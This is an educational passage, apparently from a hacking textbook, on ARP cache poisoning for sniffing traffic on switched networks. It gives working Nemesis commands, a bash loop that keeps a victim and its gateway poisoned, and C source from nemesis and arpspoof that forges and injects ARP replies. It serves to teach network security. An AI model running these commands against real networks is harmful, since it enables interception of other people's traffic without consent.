# *__Active Sniffing__*

In a _switched network environment_, packets are only sent to the port they are destined for, according to their _destination MAC addresses_. This requires more intelligent hardware that can create and maintain a _table_ associating MAC addresses with certain ports, depending on which _device_ is connected to each _port_, as illustrated here.

The advantage of a switched environment is that devices are only sent packets that are meant for them, so that promiscuous devices aren’t able to sniff any additional packets. But even in a switched environment, there are clever ways to sniff other devices’ packets; they just tend to be a bit more complex. In order to find hacks like these, the details of the protocols must be examined and then combined.

One important aspect of network communications that can be manipulated for interesting effects is the _source address_. There’s no provision in these protocols to ensure that the source address in a packet really is the address of the source machine. The act of forging a source address in a packet is known as __spoofing__. The addition of _spoofing_ to your bag of tricks greatly increases the number of possible hacks, since most systems expect the source address to be valid.

<div align="left" width="100%">
<img src="Switched_Network.png?raw=true" alt="Switched Network" width="100%">
</div>

Spoofing is the first step in sniffing packets on a switched network. The other two interesting details are found in __ARP__. First, when an _ARP reply_ comes in with an IP address that already exists in the _ARP cache_, the receiving system will overwrite the prior MAC address information with the new information found in the reply (unless that entry in the _ARP cache_ was explicitly marked as permanent). Second, no state information about the ARP traffic is kept, since this would require additional memory and would complicate a protocol that is meant to be simple. This means systems will accept an _ARP reply_ even if they didn’t send out an _ARP request_.

These three details, when exploited properly, allow an attacker to sniff network traffic on a switched network using a technique known as __ARP redirection__. The attacker sends _spoofed ARP replies_ to certain devices that cause the _ARP cache_ entries to be overwritten with the attacker’s data. This technique is called __ARP cache poisoning__. In order to sniff network traffic between two points, _A_ and _B_, the attacker needs to poison the ARP cache of A to cause A to believe that B’s IP address is at the attacker’s MAC address, and also poison the ARP cache of B to cause B to believe that A’s IP address is also at the attacker’s MAC address. Then the attacker’s machine simply needs to forward these packets to their appropriate final destinations. After that, all of the traffic between A and B still gets delivered, but it all flows through the attacker’s machine, as shown here.

<div align="left" width="100%">
<img src="ARP_Redirection.png?raw=true" alt="ARP Redirection" width="100%">
</div>

Since _A_ and _B_ are wrapping their own Ethernet headers on their packets based on their respective _ARP caches_, A’s IP traffic meant for B is actually sent to the attacker’s MAC address, and vice versa. The switch only filters traffic based on MAC address, so the switch will work as it’s designed to, sending A’s and B’s IP traffic, destined for the attacker’s MAC address, to the attacker’s port. Then the attacker rewraps the IP packets with the proper Ethernet headers and sends them back to the switch, where they are finally routed to their proper destination. The switch works properly; it’s the victim machines that are tricked into redirecting their traffic through the attacker’s machine.

Due to _timeout_ values, the victim machines will periodically send out real _ARP requests_ and receive real _ARP replies_ in response. In order to maintain the redirection attack, the attacker must keep the victim machine’s ARP caches poisoned. A simple way to accomplish this is to send _spoofed ARP replies_ to both A and B at a constant interval—for example, every _10 seconds_.

A __gateway__ is a system that routes all the traffic from a local network out to the Internet. ARP redirection is particularly interesting when one of the victim machines is the __default gateway__, since the traffic between the _default gateway_ and another system is that system’s _Internet traffic_. For example, if a machine at _192.168.0.118_ is communicating with the gateway at _192.168.0.1_ over a switch, the traffic will be restricted by MAC address. This means that this traffic cannot normally be sniffed, even in _promiscuous mode_. In order to sniff this traffic, it must be redirected.

To redirect the traffic, first the MAC addresses of _192.168.0.118_ and _192.168.0.1_ need to be determined. This can be done by _pinging_ these hosts, since any IP connection attempt will use ARP. If you run a _sniffer_, you can see the ARP communications, but the OS will cache the resulting IP/MAC address associations.

<pre style="color: white;">
reader@hacking:~/booksrc $ ping -c 1 -w 1 192.168.0.1
PING 192.168.0.1 (192.168.0.1): 56 octets data
64 octets from 192.168.0.1: icmp_seq=0 ttl=64 time=0.4 ms
--- 192.168.0.1 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.4/0.4/0.4 ms
reader@hacking:~/booksrc $ ping -c 1 -w 1 192.168.0.118
PING 192.168.0.118 (192.168.0.118): 56 octets data
64 octets from 192.168.0.118: icmp_seq=0 ttl=128 time=0.4 ms
--- 192.168.0.118 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.4/0.4/0.4 ms
reader@hacking:~/booksrc $ arp -na
? (192.168.0.1) at 00:50:18:00:0F:01 [ether] on eth0
? (192.168.0.118) at 00:C0:F0:79:3D:30 [ether] on eth0
reader@hacking:~/booksrc $ ifconfig eth0
eth0    Link encap:Ethernet HWaddr 00:00:AD:D1:C7:ED
        inet addr:192.168.0.193 Bcast:192.168.0.255 Mask:255.255.255.0
        UP BROADCAST NOTRAILERS RUNNING MTU:1500 Metric:1
        RX packets:4153 errors:0 dropped:0 overruns:0 frame:0
        TX packets:3875 errors:0 dropped:0 overruns:0 carrier:0
        collisions:0 txqueuelen:100
        RX bytes:601686 (587.5 Kb) TX bytes:288567 (281.8 Kb)
        Interrupt:9 Base address:0xc000
reader@hacking:~/booksrc $
</pre>

After pinging, the MAC addresses for both _192.168.0.118_ and _192.168.0.1_ are in the attacker’s ARP cache. This way, packets can reach their final destinations after being redirected to the attacker’s machine. Assuming IP forwarding capabilities are compiled into the kernel, all we need to do is send some spoofed ARP replies at regular intervals. _192.168.0.118_ needs to be told that _192.168.0.1_ is at _00:00:AD:D1:C7:ED_, and _192.168.0.1_ needs to be told that _192.168.0.118_ is also at _00:00:AD:D1:C7:ED_. These spoofed ARP packets can be injected using a command-line packet injection tool called `Nemesis`. _Nemesis_ was originally a suite of tools written by Mark Grimes, but in the most recent version 1.4, all functionality has been rolled up into a single utility by the new maintainer and developer, Jeff Nathan. The source code for Nemesis is on the LiveCD at _/usr/src/nemesis-1.4/_, and it has already been built and installed.

<pre style="color: white;">
reader@hacking:~/booksrc $ nemesis

NEMESIS -=- The NEMESIS Project Version 1.4 (Build 26)

NEMESIS Usage:
  nemesis [mode] [options]

NEMESIS modes:
  arp
  dns
  ethernet
  icmp
  igmp
  ip
  ospf (currently non-functional)
  rip
  tcp
  udp

NEMESIS options:
  To display options, specify a mode with the option "help".

reader@hacking:~/booksrc $ nemesis arp help

ARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)

ARP/RARP Usage:
 arp [-v (verbose)] [options]

ARP/RARP Options:
  -S &lt;Source IP address&gt;
  -D &lt;Destination IP address&gt;
  -h &lt;Sender MAC address within ARP frame&gt;
  -m &lt;Target MAC address within ARP frame&gt;
  -s &lt;Solaris style ARP requests with target hardware addess set to broadcast&gt;
  -r ({ARP,RARP} REPLY enable)
  -R (RARP enable)
  -P &lt;Payload file&gt;

Data Link Options:
  -d &lt;Ethernet device name&gt;
  -H &lt;Source MAC address&gt;
  -M &lt;Destination MAC address&gt;

You must define a Source and Destination IP address.

reader@hacking:~/booksrc $ sudo nemesis arp -v -r -d eth0 -S 192.168.0.1 -D
192.168.0.118 -h 00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED -
M 00:C0:F0:79:3D:30

ARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)

               [MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30
     [Ethernet type] ARP (0x0806)
  
  [Protocol addr:IP] 192.168.0.1 > 192.168.0.118
 [Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30
        [ARP opcode] Reply
  [ARP hardware fmt] Ethernet (1)
  [ARP proto format] IP (0x0800)
  [ARP protocol len] 6
  [ARP hardware len] 4

Wrote 42 byte unicast ARP request packet through linktype DLT_EN10MB

ARP Packet Injected
reader@hacking:~/booksrc $ sudo nemesis arp -v -r -d eth0 -S 192.168.0.118 -D
192.168.0.1 -h 00:00:AD:D1:C7:ED -m 00:50:18:00:0F:01 -H 00:00:AD:D1:C7:ED -M
00:50:18:00:0F:01

ARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)

              [MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01
    [Ethernet type] ARP (0x0806)

 [Protocol addr:IP] 192.168.0.118 > 192.168.0.1
[Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01
        [ARP opcode] Reply
  [ARP hardware fmt] Ethernet (1)
  [ARP proto format] IP (0x0800)
  [ARP protocol len] 6
  [ARP hardware len] 4

Wrote 42 byte unicast ARP request packet through linktype DLT_EN10MB.

ARP Packet Injected
reader@hacking:~/booksrc $
</pre>

These two commands spoof ARP replies from _192.168.0.1_ to _192.168.0.118_ and vice versa, both claiming that their MAC address is at the attacker’s MAC address of _00:00:AD:D1:C7:ED_. If these commands are repeated every _10 seconds_, these bogus ARP replies will continue to keep the ARP caches poisoned and the traffic redirected. The standard `BASH` shell allows commands to be scripted, using familiar control flow statements. A simple _BASH shell_ while loop is used below to loop forever, sending our two poisoning _ARP replies_ every _10 seconds_.

<pre style="color: white;">
reader@hacking:~/booksrc $ while true
> do
> sudo nemesis arp -v -r -d eth0 -S 192.168.0.1 -D 192.168.0.118 -h
00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED -M
00:C0:F0:79:3D:30
> sudo nemesis arp -v -r -d eth0 -S 192.168.0.118 -D 192.168.0.1 -h
00:00:AD:D1:C7:ED -m 00:50:18:00:0F:01 -H 00:00:AD:D1:C7:ED -M
00:50:18:00:0F:01
> echo "Redirecting..."
> sleep 10
> done

ARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)

               [MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30
     [Ethernet type] ARP (0x0806)

  [Protocol addr:IP] 192.168.0.1 > 192.168.0.118
 [Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30
        [ARP opcode] Reply
  [ARP hardware fmt] Ethernet (1)
  [ARP proto format] IP (0x0800)
  [ARP protocol len] 6
  [ARP hardware len] 4
Wrote 42 byte unicast ARP request packet through linktype DLT_EN10MB.

ARP Packet Injected

ARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)

               [MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01
     [Ethernet type] ARP (0x0806)
  
  [Protocol addr:IP] 192.168.0.118 > 192.168.0.1
 [Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01
        [ARP opcode] Reply
  [ARP hardware fmt] Ethernet (1)
  [ARP proto format] IP (0x0800)
  [ARP protocol len] 6
  [ARP hardware len] 4
Wrote 42 byte unicast ARP request packet through linktype DLT_EN10MB.
ARP Packet Injected
Redirecting...
</pre>

You can see how something as simple as Nemesis and the standard __BASH shell__ can be used to quickly hack together a network exploit. Nemesis uses a C library called __libnet__ to craft spoofed packets and inject them. Similar to _libpcap_, this library uses raw sockets and evens out the inconsistencies between platforms with a standardized interface. _libnet_ also provides several convenient functions for dealing with network packets, such as checksum generation.

The _libnet_ library provides a simple and uniform API to craft and inject network packets. It’s well documented and the functions have descriptive names. A high-level glance at the source code for _Nemesis_ shows how easy it is to craft ARP packets using _libnet_. The source file _nemesis-arp.c_ contains several functions for crafting and injecting ARP packets, using statically defined data structures for the packet header information. The _nemesis_arp()_ function shown below is called in _nemesis.c_ to build and inject an _ARP packet_.

__From nemesis-arp.c__

```c
static ETHERhdr etherhdr;
static ARPhdr arphdr;

...

void nemesis_arp(int argc, char** argv)
{
    const char* module= "ARP/RARP Packet Injection";
    
    nemesis_maketitle(title, module, version);
    
    if (argc > 1 && !strncmp(argv[1], "help", 4))
        arp_usage(argv[0]);
    
    ////////////////// RELEVANT FUNCTIONS //////////////////
    arp_initdata();
    arp_cmdline(argc, argv);
    arp_validatedata();
    arp_verbose();
    ////////////////// RELEVANT FUNCTIONS //////////////////

    if (got_payload)
    {
        if (builddatafromfile(ARPBUFFSIZE, &pd, (const char *)file,
            (const u_int32_t)PAYLOADMODE) < 0)
            arp_exit(1);
    }

    ///////////// RELEVANT CONDITIONAL BRANCHES /////////////
    if (buildarp(&etherhdr, &arphdr, &pd, device, reply) < 0)
    {
        printf("\n%s Injection Failure\n", (rarp == 0 ? "ARP" : "RARP"));
        arp_exit(1);
    }
    else
    {
        printf("\n%s Packet Injected\n", (rarp == 0 ? "ARP" : "RARP"));
        arp_exit(0);
    }
    ///////////// RELEVANT CONDITIONAL BRANCHES /////////////
}
```

The structures __ETHERhdr__ and __ARPhdr__ are defined in the file _nemesis.h_ (shown below) as aliases for existing _libnet data_ structures. In C, __typedef__ is used to alias a data type with a symbol.

__From nemesis.h__

```c
typedef struct libnet_arp_hdr ARPhdr;
typedef struct libnet_as_lsa_hdr ASLSAhdr;
typedef struct libnet_auth_hdr AUTHhdr;
typedef struct libnet_dbd_hdr DBDhdr;
typedef struct libnet_dns_hdr DNShdr;
typedef struct libnet_ethernet_hdr ETHERhdr;
typedef struct libnet_icmp_hdr ICMPhdr;
typedef struct libnet_igmp_hdr IGMPhdr;
typedef struct libnet_ip_hdr IPhdr;
```

The _nemesis_arp()_ function calls a series of other functions from this file: _arp_initdata()_, _arp_cmdline()_, _arp_validatedata()_, and _arp_verbose()_. You can probably guess that these functions initialize data, process command-line arguments, validate data, and do some sort of verbose reporting. The _arp_initdata()_ function does exactly this, initializing values in statically declared data structures.

The _arp_initdata()_ function, shown below, sets various elements of the header structures to the appropriate values for an ARP packet.

__From nemesis-arp.c__

```c
static void arp_initdata(void)
{
    /* defaults */
    etherhdr.ether_type = ETHERTYPE_ARP; /* Ethernet type ARP */
    memset(etherhdr.ether_shost, 0, 6); /* Ethernet source address */
    memset(etherhdr.ether_dhost, 0xff, 6); /* Ethernet destination address */
    arphdr.ar_op = ARPOP_REQUEST; /* ARP opcode: request */
    arphdr.ar_hrd = ARPHRD_ETHER; /* hardware format: Ethernet */
    arphdr.ar_pro = ETHERTYPE_IP; /* protocol format: IP */
    arphdr.ar_hln = 6; /* 6 byte hardware addresses */
    arphdr.ar_pln = 4; /* 4 byte protocol addresses */
    memset(arphdr.ar_sha, 0, 6); /* ARP frame sender address */
    memset(arphdr.ar_spa, 0, 4); /* ARP sender protocol (IP) addr */
    memset(arphdr.ar_tha, 0, 6); /* ARP frame target address */
    memset(arphdr.ar_tpa, 0, 4); /* ARP target protocol (IP) addr */
    pd.file_mem = NULL;
    pd.file_s = 0;
    return;
}
```

Finally, the _nemesis_arp()_ function calls the function _buildarp()_ with pointers to the header data structures. Judging from the way the return value from _buildarp()_ is handled here, _buildarp()_ builds the packet and injects it. This function is found in yet another source file, _nemesis-proto_arp.c_.

__From nemesis-proto_arp.c__

```c
int buildarp(ETHERhdr* eth, ARPhdr* arp, FileData* pd, char* device, int reply)
{
    int n = 0;
    u_int32_t arp_packetlen;
    static u_int8_t* pkt;
    struct libnet_link_int* l2 = NULL;

    /* validation tests */
    if (pd->file_mem == NULL)
        pd->file_s = 0;

    arp_packetlen = LIBNET_ARP_H + LIBNET_ETH_H + pd->file_s;

#ifdef DEBUG
    printf("DEBUG: ARP packet length %u.\n", arp_packetlen);
    printf("DEBUG: ARP payload size %u.\n", pd->file_s);
#endif

    if ((l2 = libnet_open_link_interface(device, errbuf)) == NULL)
    {
        nemesis_device_failure(INJECTION_LINK, (const char*)device);
        return -1;
    }

    if (libnet_init_packet(arp_packetlen, &pkt) == -1)
    {
        fprintf(stderr, "ERROR: Unable to allocate packet memory.\n");
        return -1;
    }

    libnet_build_ethernet(eth->ether_dhost, eth->ether_shost, eth->ether_type,
        NULL, 0, pkt);

    libnet_build_arp(arp->ar_hrd, arp->ar_pro, arp->ar_hln, arp->ar_pln,
        arp->ar_op, arp->ar_sha, arp->ar_spa, arp->ar_tha, arp->ar_tpa,
        pd->file_mem, pd->file_s, pkt + LIBNET_ETH_H);

    n = libnet_write_link_layer(l2, device, pkt, LIBNET_ETH_H +
        LIBNET_ARP_H + pd->file_s);

    if (verbose == 2)
        nemesis_hexdump(pkt, arp_packetlen, HEX_ASCII_DECODE);
    if (verbose == 3)
        nemesis_hexdump(pkt, arp_packetlen, HEX_RAW_DECODE);

    if (n != arp_packetlen)
    {
        fprintf(stderr, "ERROR: Incomplete packet injection. Only "
            "wrote %d bytes.\n", n);
    }
    else
    {
        if (verbose)
        {
            if (memcmp(eth->ether_dhost, (void*)&one, 6))
            {
                printf("Wrote %d byte unicast ARP request packet through "
                    "linktype %s.\n", n,
                nemesis_lookup_linktype(l2->linktype));
            }
            else
            {
                printf("Wrote %d byte %s packet through linktype %s.\n", n,
                    (eth->ether_type == ETHERTYPE_ARP ? "ARP" : "RARP"),
                nemesis_lookup_linktype(l2->linktype));
            }
        }
    }
    
    libnet_destroy_packet(&pkt);
    if (l2 != NULL)
        libnet_close_link_interface(l2);
    return (n);
}
```

At a high level, this function should be readable to you. Using _libnet_ functions, it opens a link interface and initializes memory for a packet. Then, it builds the Ethernet layer using elements from the Ethernet header data structure and then does the same for the ARP layer. Next, it writes the packet to the device to inject it, and finally cleans up by destroying the packet and closing the interface. The documentation for these functions from the libnet man page is shown below for clarity.

__From the libnet Man Page__

<pre style="color: white;">
<strong><em>libnet_open_link_interface()</em></strong> opens a low-level packet interface. This is required to write link layer frames. Supplied is a u_char pointer to the interface device name and a u_char pointer to an error buffer. Returned is a
filled in libnet_link_int struct or NULL on error.

<strong><em>libnet_init_packet()</em></strong> initializes a packet for use. If the size parameter is omitted (or negative) the library will pick a reasonable value for the user (currently LIBNET_MAX_PACKET). If the memory allocation is successful, the
memory is zeroed and the function returns 1. If there is an error, the function returns -1. Since this function calls malloc, you certainly should, at some point, make a corresponding call to destroy_packet().

<strong><em>libnet_build_ethernet()</em></strong> constructs an ethernet packet. Supplied is the destination address, source address (as arrays of unsigned characterbytes) and the ethernet frame type, a pointer to an optional data payload, the payload length, and a pointer to a pre-allocated block of memory for the packet. The ethernet packet type should be one of the following:

Value Type
ETHERTYPE_PUP PUP protocol
ETHERTYPE_IP IP protocol
ETHERTYPE_ARP ARP protocol
ETHERTYPE_REVARP Reverse ARP protocol
ETHERTYPE_VLAN IEEE VLAN tagging
ETHERTYPE_LOOPBACK Used to test interfaces

<strong><em>libnet_build_arp()</em></strong> constructs an ARP (Address Resolution Protocol) packet. Supplied are the following: hardware address type, protocol address type, the hardware address length, the protocol address length, the ARP packet type, the sender hardware address, the sender protocol address, the target hardware address, the target protocol address, the packet payload, the payload size, and finally, a pointer to the packet header memory. Note that this function only builds ethernet/IP ARP packets, and consequently the first value should be ARPHRD_ETHER. The ARP packet type should be one of the following: ARPOP_REQUEST, ARPOP_REPLY, ARPOP_REVREQUEST, ARPOP_REVREPLY, ARPOP_INVREQUEST, or ARPOP_INVREPLY.

<strong><em>libnet_destroy_packet()</em></strong> frees the memory associated with the packet.

<strong><em>libnet_close_link_interface()</em></strong> closes an opened low-level packet interface. Returned is 1 upon success or -1 on error.
</pre>

With a basic understanding of C, API documentation, and common sense, you can teach yourself just by examining open source projects. For example, Dug Song provides a program called arpspoof, included with dsniff, that performs the ARP redirection attack.

__From the arpspoof Man Page__

<pre style="color: white;">
NAME
       arpspoof - intercept packets on a switched LAN

SYNOPSIS
       arpspoof [-i interface] [-t target] host

DESCRIPTION
       arpspoof redirects packets from a target host (or all hosts) on the LAN
       intended for another host on the LAN by forging ARP replies. This is
       an extremely effective way of sniffing traffic on a switch.
       Kernel IP forwarding (or a userland program which accomplishes the
       same, e.g. fragrouter(8)) must be turned on ahead of time.

OPTIONS
       -i interface
              Specify the interface to use.

       -t target
              Specify a particular host to ARP poison (if not specified, all
              hosts on the LAN).

        host  Specify the host you wish to intercept packets for (usually the
              local gateway).

SEE ALSO
       dsniff(8), fragrouter(8)
AUTHOR
       Dug Song &lt;dugsong@monkey.org&gt;
</pre>

The magic of this program comes from its _arp_send()_ function, which also uses _libnet_ to spoof packets. The source code for this function should be readable to you, since many of the previously explained _libnet_ functions are used (shown in bold below). The use of structures and an error buffer should also be familiar.

__arpspoof.__

```c
static struct libnet_link_int* llif;
static struct ether_addr spoof_mac, target_mac;
static in_addr_t spoof_ip, target_ip;

...

int arp_send(struct libnet_link_int* llif, char* dev, int op, u_char* sha, 
    in_addr_t spa, u_char* tha, in_addr_t tpa)
{
    char ebuf[128];
    u_char pkt[60];

    if (sha == NULL && (sha = (u_char *)libnet_get_hwaddr(llif, dev, ebuf)) == NULL) 
    {
        return -1;
    }
    if (spa == 0) 
    {
        if ((spa = libnet_get_ipaddr(llif, dev, ebuf)) == 0)
            return -1;
        spa = htonl(spa); /* XXX */
    }
    if (tha == NULL)
        tha = "\xff\xff\xff\xff\xff\xff";
    
    /////////////////// LIBNET FUNCTIONS ///////////////////
    libnet_build_ethernet(tha, sha, ETHERTYPE_ARP, NULL, 0, pkt);
    
    libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, ETHER_ADDR_LEN, 4, op, sha, 
        u_char*)&spa, tha, (u_char*)&tpa, NULL, 0, pkt + ETH_H);
    /////////////////// LIBNET FUNCTIONS ///////////////////

    fprintf(stderr, "%s ", ether_ntoa((struct ether_addr*)sha));

    if (op == ARPOP_REQUEST) 
    {
        fprintf(stderr, "%s 0806 42: arp who-has %s tell %s\n",
            ether_ntoa((struct ether_addr*)tha),
            libnet_host_lookup(tpa, 0),
            libnet_host_lookup(spa, 0));
    }
    else 
    {
        fprintf(stderr, "%s 0806 42: arp reply %s is-at ",
            ether_ntoa((struct ether_addr*)tha),
            libnet_host_lookup(spa, 0));
        fprintf(stderr, "%s\n", ether_ntoa((struct ether_addr*)sha));
    }
    /////////////////// LIBNET FUNCTIONS ///////////////////
    return (libnet_write_link_layer(llif, dev, pkt, sizeof(pkt)) == sizeof(pkt));
    /////////////////// LIBNET FUNCTIONS ///////////////////
}
```

The remaining libnet functions get hardware addresses, get the IP address, and look up hosts. These functions have descriptive names and are explained in detail on the _libnet_ man page.

<pre style="color: white;">
<strong><em>libnet_get_hwaddr()</em></strong> takes a pointer to a link layer interface struct, a pointer to the network device name, and an empty buffer to be used in case of error. The function returns the MAC address of the specified interface upon success or 0 upon error (and errbuf will contain a reason).

<strong><em>libnet_get_ipaddr()</em></strong> takes a pointer to a link layer interface struct, a pointer to the network device name, and an empty buffer to be used in case of error. Upon success the function returns the IP address of the specified interface in host-byte order or 0 upon error (and errbuf will contain a reason).

<strong><em>libnet_host_lookup()</em></strong> converts the supplied network-ordered (big-endian) IPv4 address into its human-readable counterpart. If use_name is 1, libnet_host_lookup() will attempt to resolve this IP address and return a hostname, otherwise (or if the lookup fails), the function returns a dotteddecimal ASCII string.
</pre>

Once you’ve learned how to read C code, existing programs can teach you a lot by example. Programming libraries like libnet and libpcap have plenty of documentation that explains all the details you may not be able to divine from the source alone. The goal here is to teach you how to learn from source code, as opposed to just teaching how to use a few libraries. After all, there are many other libraries and a lot of existing source code that uses them.